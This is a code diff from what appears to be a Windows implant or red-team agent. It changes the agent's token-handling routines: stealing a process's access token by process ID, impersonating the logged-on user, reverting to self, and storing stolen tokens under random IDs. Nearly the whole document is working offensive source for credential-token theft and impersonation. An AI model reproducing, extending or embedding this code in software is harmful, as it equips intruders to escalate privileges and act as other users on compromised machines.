@@ -94,7 +94,7 @@ auto DECLFN Token::GetByID(
 }
 
 auto DECLFN Token::Rev2Self( VOID ) -> BOOL {
-    return this->Use( this->Current() );
+    return Self->Advapi32.RevertToSelf();
 }
 
 auto DECLFN Token::Rm(
@@ -134,16 +134,17 @@ auto DECLFN Token::Rm(
 auto DECLFN Token::Use(
     _In_ HANDLE TokenHandle
 ) -> BOOL {
-    // return ImpersonateLoggedOnUser( TokenHandle ); 
+    return Self->Advapi32.ImpersonateLoggedOnUser( TokenHandle ); 
 }
 
 auto DECLFN Token::Steal(
     _In_ ULONG ProcessID
-) -> HANDLE {
+) -> TOKEN_NODE* {
     HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
     HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
 
-    LONG TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
+    LONG  TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
+    ULONG TokenID    = Rnd32() % 9999;
 
     TokenHandle = this->Current();
 
@@ -152,18 +153,22 @@ auto DECLFN Token::Steal(
     Self->Ntdll.NtClose( TokenHandle );
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
-    if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return ProcessHandle;
+    if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return nullptr;
 
     Self->Tkn->ProcOpen( ProcessHandle, TokenFlags, &TokenHandle );
-    if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return TokenHandle;
+    if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return nullptr;
 
     TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
+
+    while( this->GetByID( TokenID ) ) {
+        TokenID = Rnd32() % 9999;
+    }
 
     NewNode->Handle    = TokenHandle;
     NewNode->Host      = Self->Machine.CompName;
     NewNode->ProcessID = ProcessID;
     NewNode->User      = this->GetUser( TokenHandle );
-    NewNode->TokenID   = Rnd32() % 9999;
+    NewNode->TokenID   = TokenID;
 
     if ( !this->Node ) {
         this->Node = NewNode;
@@ -177,6 +182,8 @@ auto DECLFN Token::Steal(
     }
 
     if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );
+
+    return NewNode;
 }
 
 auto DECLFN Token::SetPriv(
